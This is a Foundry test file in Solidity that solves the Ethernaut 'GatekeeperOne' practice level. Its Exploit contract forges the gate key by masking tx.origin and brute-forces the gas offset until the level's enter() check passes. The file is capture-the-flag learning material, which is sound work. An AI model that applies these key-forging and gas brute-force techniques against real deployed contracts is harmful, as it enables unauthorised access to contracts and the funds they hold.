// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {GatekeeperOne} from "../../src/13/GatekeeperOne.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {GatekeeperOneFactory} from "src/13/GatekeeperOneFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract GatekeeperOneTest is Test, BaseTest {
    GatekeeperOne public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new GatekeeperOneFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 1 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = GatekeeperOne(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        Exploit exploit = new Exploit(instanceContract);

        // function prank(address sender, address origin)
        vm.prank(player, player);
        exploit.exploitEnterFunction();

        vm.startPrank(player);

        vm.stopPrank();

        assert(instanceContract.entrant() == player);
    }
}

contract Exploit {
    GatekeeperOne instance;

    constructor(GatekeeperOne _instance) {
        instance = _instance;
    }

    function exploitEnterFunction() external {
        // first requirement: `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
        // the 4 less important bytes equal to the 2 less important bytes => mask = 0x0000FFFF
        // second requirement: `uint32(uint64(_gateKey)) != uint64(_gateKey)
        // the less important 8 bytes of the input must be different compared to the less important 4 bytes
        // <=> So we need to make 0x00000000001111 be != 0xXXXXXXXX00001111
        // The first four bytes remain unchanged, we can update the most important bytes to any combination
        // One of which is 0xFFFFFFFF0000FFFF (but any of 0xFF0FFFFF0000FFFF, 0xF000FFFF0000FFFF .... would work)
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & bytes8(0xFFFFFFFF0000FFFF);
        // try to estimate the correct gas that would trigger the function
        for (uint256 i = 0; i <= 8191; ++i) {
            try instance.enter{gas: (8191 * 10) + i}(key) {
                console.log("passed with gas ->", (8191 * 10) + i);
                break;
            } catch {}
        }
    }
}
